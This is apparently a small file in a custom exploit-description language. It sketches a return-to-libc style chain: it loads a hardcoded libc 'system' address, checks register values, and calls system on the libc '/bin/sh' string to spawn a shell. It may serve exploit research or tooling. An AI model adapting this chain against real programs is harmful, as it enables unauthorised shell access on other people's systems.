IMPORT DISPATCH () RETURNS NONE FROM "functiondispatch.py";
IMPORT READ () RETURNS int FROM "functionread.py";
IMPORT MANIPULATE () RETURNS NONE FROM "functionmanipulate.py";
IMPORT EXECUTE (int) RETURNS NONE FROM "functionexecute.py";

DISPATCH {
    int system = 0x7ffff784e390;
    reg _r0 = READ();
    ASSERT _r0 == 0x10;
    reg _r2 = READ();
    ASSERT _r2 == 0x7ffff7995d47;
    MANIPULATE(_r0);
    ASSERT _r0 == 0x7ffff7995d57; // address of /bin/sh in libc
    EXECUTE(system);
}
